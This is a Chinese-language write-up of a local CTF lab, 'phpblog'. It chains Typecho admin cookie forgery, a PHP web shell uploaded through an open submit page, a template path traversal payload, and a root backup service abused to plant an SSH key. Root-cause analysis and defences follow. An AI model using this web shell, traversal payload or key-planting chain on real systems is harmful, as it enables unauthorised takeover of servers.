# LAB / phpblog Writeup：从公开上传到 root 备份恢复链

| 项 | 内容 |
|---|---|
| 靶机 | LAB / phpblog |
| 难度 | Baby |
| 目标 | `192.168.56.101` |
| 操作系统 | Debian 13 / Linux 6.12 |
| 应用 | Apache 2.4.68、PHP-FPM 8.4.24、Typecho 1.3.0 |
| 最终权限 | `root` |
| Flag | `flag{root-7e934684eafe9fe6f1c32d6b06207c7f}` |
| 完成日期 | 2026-11-18 |
| 关键路径 | 匿名上传 → 后台会话恢复 → 模板路径穿越 → `momo` RCE → `blogbackup` 文件恢复 → root SSH |

> 本文仅用于已经授权的本地靶场和教学环境。所有命令、测试文件与持久化入口都应在实验结束后清理。
>
> 第一次复现且不熟悉基础概念时，配合阅读
> [复现原理详解.md](复现原理详解.md)，再按 [复现指导.md](复现指导.md) 操作。
>
> 个人思考、能力评估和提问复盘见 [技术复盘报告.md](技术复盘报告.md)。

## TL;DR

phpblog 的公开投稿页允许把任意同名文件写入 `/tmp/submissions`。后台页面的 `template`
字段没有做路径约束，最终被拼接进主题目录并交给 `require_once` 执行，因此组合出了一个
`momo` 身份的 Web RCE。

低权限用户可以从 root 运行的 `blogbackup.service` 进程参数中读取服务 token。该服务的
`jobs/` 与 `staging/` 目录对 `momo` 组可写，而且恢复目标允许
`/root/.ssh/authorized_keys`。提交一个合法任务后，服务会以 root 身份复制攻击者准备的文件，
最终形成 root 持久化入口。

```
匿名上传
  └─ /tmp/submissions/shell.php
       └─ Typecho template 路径穿越
            └─ require_once("/tmp/submissions/shell.php")
                 └─ momo RCE
                      ├─ 读取 blogbackup root token
                      ├─ 写入 jobs + staging
                      └─ restore → /root/.ssh/authorized_keys
                           └─ root shell → flag
```

## 1. 侦察与攻击面收敛

### 1.1 端口与服务

在 Kali 中执行：

```bash
nmap -p- --min-rate 2000 -T4 192.168.56.101 -oN nmap_all.txt
nmap -sC -sV -p22,80 192.168.56.101 -oN nmap_svc.txt
```

关键结果：

```text
22/tcp open  ssh  OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp open  http Apache httpd 2.4.68 (Debian)
```

Web 指纹显示：

```text
Typecho 1.3.0
PHP 8.4.24
X-Pingback: /index.php/action/xmlrpc
```

完整结果保存在 [01_recon/nmap_svc.txt](01_recon/nmap_svc.txt)。

### 1.2 Web 结构与异常入口

首页 footer 暴露了两个很少见、但非常值得检查的入口：

```text
/usr/themes/classic-22/submit/
/usr/themes/classic-22/docs/changelog.md
```

投稿页无需登录即可提交附件，并且会原样保留上传文件名。更新日志还提到：

```text
投稿页的 session 编码器切到 php_serialize
状态页仍沿用默认的 php
清理器必须在 session_start() 之前加载
发布前移除 ../lib/TempCleaner.php.bak
```

这说明该主题的 `submit`、`status`、`TempCleaner` 之间存在一组有意留下的不安全状态。
不过最终最短且稳定的攻击路径不需要依赖不稳定的对象注入，而是利用上传点与页面模板参数组合。

## 2. 后台会话恢复

离线镜像审计得到 SQLite 数据库 `/var/lib/typecho/blog.sqlite`，其中管理员为 `momo`。
Typecho 的登录 Cookie 不是只依赖密码哈希：用户表中的 `authCode` 会参与
`Common::hash()`，Cookie 前缀则由站点 URL 的 MD5 决定。

因此在拿到数据库的授权实验场景下，不需要爆破 phpass 密码，可以直接恢复一个等价的管理员
Cookie。仓库中的脚本已经固化了这一步骤：

```bash
python3 forge_typecho_cookie.py blog.sqlite http://192.168.56.101
```

输出形如：

```text
707690...__typecho_uid=1; 707690...__typecho_authCode=$T$123456789...
```

验证会话：

```bash
COOKIE=$(python3 forge_typecho_cookie.py blog.sqlite http://192.168.56.101)
curl -sS -b "$COOKIE" http://192.168.56.101/admin/ | grep '<title>'
```

预期标题：

```text
网站概要 - 折页手记 - Powered by Typecho
```

这一步说明了一个常见但容易被忽略的问题：**数据库泄露不仅意味着密码哈希泄露，还可能意味着
会话凭证可伪造。** 对数据库设置过宽的读取权限，会把“离线爆破”问题直接升级成“即时接管后台”。

## 3. 低权限立足点

### 3.1 任意文件上传

主题的 `submit/index.php` 逻辑如下：

```php
$dir = '/tmp/submissions';
$name = basename((string)$file['name']);
$dest = $dir . '/' . $name;
move_uploaded_file($file['tmp_name'], $dest);
```

它只处理文件名字，没有扩展名白名单、内容校验或随机名。上传一个最小 PHP shell：

```php
<?php
header('Content-Type: text/plain; charset=UTF-8');
echo "PHPBLOG_RCE\n";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
```

提交：

```bash
curl -sS \
  -F 'draft=@shell.php;filename=shell.php;type=application/x-php' \
  http://192.168.56.101/usr/themes/classic-22/submit/
```

页面返回：

```text
投稿已收到：shell.php
```

文件落在：

```text
/tmp/submissions/shell.php
```

### 3.2 页面模板路径穿越

页面编辑组件直接接收 `template`：

```php
$contents = $this->request->from(
    'text',
    'template',
    'allowComment',
    'allowPing',
    'allowFeed',
    'slug',
    'order',
    'visibility'
);
```

数据库中的页面模板随后进入了归档渲染流程：

```php
if ($this->template) {
    $this->themeFile = $this->template;
}
```

最终执行：

```php
require_once $this->themeDir . $this->themeFile;
```

关键缺失是：保存模板名时没有白名单，加载时也没有用 `realpath()` 检查结果是否仍位于
`themeDir` 内。把页面的 `template` 设置为：

```text
../../../../../../tmp/submissions/shell.php
```

访问该页面：

```bash
curl -sS \
  'http://192.168.56.101/index.php/audit-template.html?cmd=id'
```

得到：

```text
PHPBLOG_RCE
uid=1000(momo) gid=1000(momo) groups=1000(momo)
```

证据见 [05_evidence/lowpriv_rce.txt](05_evidence/lowpriv_rce.txt)。

### 3.3 为什么这条链能成立

三个条件缺一不可：

1. 公开投稿页允许把 `.php` 文件写入可预测路径。
2. 页面模板参数可以跳出主题目录。
3. PHP-FPM 的 `open_basedir` 包含 `/tmp`，允许 `require_once` 访问上传目录。

实际配置为：

```ini
user = momo
group = momo
php_admin_value[open_basedir] = /var/www/blog:/var/lib/typecho:/tmp
php_admin_value[session.save_path] = /tmp
```

所以“上传目录不在 Web 根目录”并不能单独阻断 RCE。只要应用会按路径包含文件，上传目录
仍然可能成为 PHP 执行入口。

## 4. 低权限枚举

先在 `momo` shell 中确认环境：

```bash
id
hostname
uname -a
ps -eo user,pid,args | grep '[b]logbackup'
find /var/lib/blogbackup -maxdepth 2 -ls 2>/dev/null
```

root 服务进程暴露了 token：

```text
root 555 1 0 ... /usr/bin/python3 /opt/blogbackup/agent.py \
  --token <TOKEN> --listen 127.0.0.1:9001
```

服务只监听回环地址，因此必须通过已经获得的 `momo` RCE 在本机请求它。验证 token：

```bash
curl -sS 'http://127.0.0.1:9001/status?token=<TOKEN>'
```

正常响应：

```json
{"service":"blogbackup","jobs":["daily-www"]}
```

关键权限：

```text
drwxrwsr-x root:momo /var/lib/blogbackup/jobs
drwxrwsr-x root:momo /var/lib/blogbackup/staging
```

`setgid` 和组写权限允许 `momo` 创建任务文件与恢复源文件。

## 5. 从备份服务到 root

### 5.1 服务逻辑

`blogbackup.service` 以 root 启动 `/opt/blogbackup/start.sh`。Python agent 提供三个接口：

| 方法 | 路径 | 作用 |
|---|---|---|
| GET | `/status` | 读取任务名 |
| GET | `/jobs` | 读取任务定义 |
| POST | `/restore` | 按任务执行文件恢复 |

恢复目标的允许列表包括：

```text
/var/backups/blog/www-index.php.bak
/etc/cron.d/blogbackup
/root/.ssh/authorized_keys
```

服务会校验源文件位于 staging 目录、拒绝软链接，并以 root 身份复制到目标；复制完成后强制
设置 `root:root`。

### 5.2 提交任务

任务文件：

```json
{
  "id": "audit-root-key",
  "source": "/var/lib/blogbackup/staging/audit-root-key",
  "dest": "/root/.ssh/authorized_keys",
  "schedule": "manual"
}
```

将公钥写入 staging，再将任务写入 jobs。由于命令要通过 Web shell 传输，使用 Base64 可以
避免引号、换行和 URL 编码造成的破坏。仓库脚本已封装此步骤：

```bash
bash exploit_blogbackup.sh \
  'http://192.168.56.101/index.php/audit-template.html' \
  '<TOKEN>' \
  /path/to/id_ed25519.pub
```

脚本执行的服务请求等价于：

```bash
curl -sS -X POST \
  -H 'Content-Type: application/json' \
  --data '{"id":"audit-root-key"}' \
  'http://127.0.0.1:9001/restore?token=<TOKEN>'
```

成功响应：

```json
{"ok":true,"id":"audit-root-key","dest":"/root/.ssh/authorized_keys"}
```

服务日志同时记录：

```text
restore id=audit-root-key src=/var/lib/blogbackup/staging/audit-root-key
dst=/root/.ssh/authorized_keys
POST /restore?token=<TOKEN> HTTP/1.1" 200
```

证据见 [05_evidence/03_blogbackup_restore.txt](05_evidence/03_blogbackup_restore.txt)。

### 5.3 获取 root 与 flag

```bash
ssh -i ~/.ssh/id_ed25519 root@192.168.56.101
id
cat /root/7e934684eafe9fe6f1c32d6b06207c7f.txt
```

结果：

```text
uid=0(root) gid=0(root) groups=0(root)
flag{root-7e934684eafe9fe6f1c32d6b06207c7f}
```

完整取证见 [05_evidence/02_root_proof.txt](05_evidence/02_root_proof.txt)。

## 6. 根因分析

### 6.1 漏洞一：任意文件上传

- CWE-434：Unrestricted Upload of File with Dangerous Type。
- 输入：multipart 文件名与内容。
- 缺陷：只做 `basename()`，没有扩展名、MIME、内容与实际用途校验。
- 影响：可控 PHP 文件进入 PHP-FPM 可访问的 `/tmp`。

### 6.2 漏洞二：模板路径穿越与文件包含

- CWE-22：Path Traversal。
- CWE-98：PHP 文件包含路径控制不当。
- 输入：页面编辑请求中的 `template`。
- 缺陷：写入时没有值域限制，执行时没有做 canonical path 包含关系校验。
- 影响：`momo` 代码执行。

```php
require_once $this->themeDir . $this->themeFile;
```

这行本身不是“文件包含漏洞”的全部；真正的根因是**不可信模板名与路径拼接之间缺少安全边界**。

### 6.3 漏洞三：备份恢复代理的越权写入

- CWE-269：Improper Privilege Management。
- CWE-732：Incorrect Permission Assignment for Critical Resource。
- 缺陷：低权限组可以创建 root 服务任务，任务允许覆盖 root 敏感文件。
- 模式：confused deputy——低权限用户让高权限服务代替自己完成敏感操作。

服务虽然验证了“目标在 allowlist 内”，但把
`/root/.ssh/authorized_keys` 放入了 allowlist。这等于把 root 身份控制权设计成了正常业务功能。

## 7. 防御与检测

### 7.1 应用层

1. 上传文件使用随机文件名和固定扩展名，存入不可执行目录。
2. 对文件内容做真实类型检测，不信任客户端给出的 `filename` 与 `Content-Type`。
3. 页面模板字段只接受当前主题真实存在的模板 ID，不接受任意路径。
4. 使用 `realpath()` 或 `openat2(RESOLVE_BENEATH)` 一类能力验证包含文件始终位于主题根目录。
5. 从 `open_basedir` 中移除 `/tmp`，并禁止 PHP 执行上传目录。
6. 删除生产环境中的 `.bak`、调试页和更新日志中的内部提示。

示例校验思路：

```php
$base = realpath($themeDir);
$candidate = realpath($themeDir . $template);
if ($base === false || $candidate === false ||
    !str_starts_with($candidate, $base . DIRECTORY_SEPARATOR)) {
    throw new InvalidArgumentException('invalid template');
}
```

### 7.2 备份服务

1. `jobs/` 和 `staging/` 不应允许 Web 用户写入；任务应由独立审批流程生成。
2. 恢复目标必须是业务数据目录，不能包含 cron、SSH、systemd unit 等控制面文件。
3. 服务 token 不应出现在可被普通用户读取的进程命令行中；优先使用 Unix socket 的
   peer credentials、受限文件描述符或最小权限客户端。
4. 高权限服务应拆分操作能力，采用最小权限原则，并记录任务创建者、审批者、源文件哈希和目标。
5. 对恢复任务做签名、版本化和审计；不能仅依赖一个共享的静态字符串 token。

### 7.3 可观测性

以下日志值得单独告警：

```text
POST /restore
dest=/root/.ssh/authorized_keys
dest=/etc/cron.d/*
template=../..
上传目录出现 .php
root SSH 登录来源为 Host-only 网络
```

规则应同时关联“谁创建 job”“谁调用 restore”“最终目标是什么”，避免只记录 HTTP 200。

## 8. 与 IoT 固件和科研工作的映射

### 8.1 固件中的同类形态

路由器、摄像头、NAS 和轻量 IoT 网关经常存在以下结构：

- 后台根据 `page`、`template`、`lang`、`skin` 参数选择动态页面并执行 `include` / `require`。
- 配置导入、升级包、日志包和皮肤包写到 `/tmp`、`/var/tmp` 或 Web 根目录。
- 恢复/导入功能以 root 运行，允许解压配置并写回 `/etc`、启动脚本或密钥目录。
- Web 服务账号与备份服务账号共享目录权限，或者多个高危操作只依赖一个固定 token。

phpblog 的教学价值不在于“一个 PHP 漏洞”，而在于它把三类常见工程错误串成完整权限边界突破：

```text
不可信上传 → 动态包含 → 高权限服务越权写 → 控制面持久化
```

### 8.2 可以沉淀的科研问题

1. **可达性建模**：如何从 HTTP 参数、数据库字段、动态模板名追踪到 `include/require`，
   区分仅存储的不可达数据和真正进入执行路径的 tainted data。
2. **权限差分分析**：对固件里的 Web 用户、备份服务、systemd unit、cron 和 SSH 配置建立权限图，
   自动识别普通用户能够驱动的 root 操作。
3. **恢复面攻击模型**：配置备份/恢复是控制面而不是普通文件传输，应作为高价值资产建模。
4. **检测规则工程**：把“页面模板名 → 主题目录拼接 → PHP 文件包含”和
   “低权限任务目录 → root 恢复目标”写成可复现的 Semgrep、CodeQL 或固件分析规则。
5. **最小复现集**：为不同厂商的 Web 管理面建立统一样本字段，例如动态页面参数、上传落点、
   FPM/CGI 用户、`open_basedir`、恢复目标和目录权限。

这些问题比单纯记录 payload 更适合形成计算机科学与安全方向的课程项目、竞赛题或论文中的
小规模实证研究。

## 9. 对计算机专业能力的具体收益

这道题连接了多门课程和工程能力：

| 知识点 | 本题中的具体体现 |
|---|---|
| 操作系统 | 用户/组、`setgid` 目录、进程、文件权限、realpath |
| Web 原理 | multipart 上传、Cookie、会话、动态路由、模板渲染 |
| 网络安全 | Host-only 网络、端口服务、回环接口、HTTP 认证 |
| 密码学工程 | MD5 前缀、Typecho 自定义 hash、会话凭证恢复 |
| 软件安全 | 路径穿越、任意上传、confused deputy、最小权限 |
| 静态分析 | 从输入到数据库到 `require_once` 的可达路径分析 |
| 工程复现 | 脚本化 payload、Base64 传输、证据保存、清理与回滚 |

建议后续复现时不要只复制 flag，而是至少完成三次训练：

1. **按 WP 跑通**：确认每个请求、每个权限点和每个证据点都能对应。
2. **脱稿解释**：能独立画出数据流、权限流和攻击链。
3. **迁移检查**：在另一个 PHP/固件 Web 项目中寻找模板参数、上传落点、恢复服务三个检查点。

## 10. 时间线与证据

| 日期 | 阶段 | 结果 |
|---|---|---|
| 11.08–11.15 | 环境、侦察、源码审计、低权限立足 | 获得 `momo` RCE |
| 11.18 | 恢复低权限入口、验证 `blogbackup` | 获得 root |
| 11.18 | 复现、取证、WP 与复现指导 | 攻击链闭环 |

证据文件：

- [低权限 RCE](05_evidence/lowpriv_rce.txt)
- [root 身份与 flag](05_evidence/02_root_proof.txt)
- [blogbackup 恢复日志](05_evidence/03_blogbackup_restore.txt)
- [清理与回滚验证](05_evidence/04_cleanup.txt)
- [用户复现记录：root 与 flag](05_evidence/05_reproduction_root_proof.txt)
- [用户复现记录：清理过程](05_evidence/06_reproduction_cleanup.txt)
- [用户复现记录：清理后验证](05_evidence/07_post_cleanup_verification.txt)
- [扫描结果](01_recon/nmap_svc.txt)
- [服务代码与配置](03_privesc/)

## 参考

- [Typecho 官网](https://typecho.org/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-98](https://cwe.mitre.org/data/definitions/98.html)
- [CWE-269](https://cwe.mitre.org/data/definitions/269.html)
- [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-732](https://cwe.mitre.org/data/definitions/732.html)
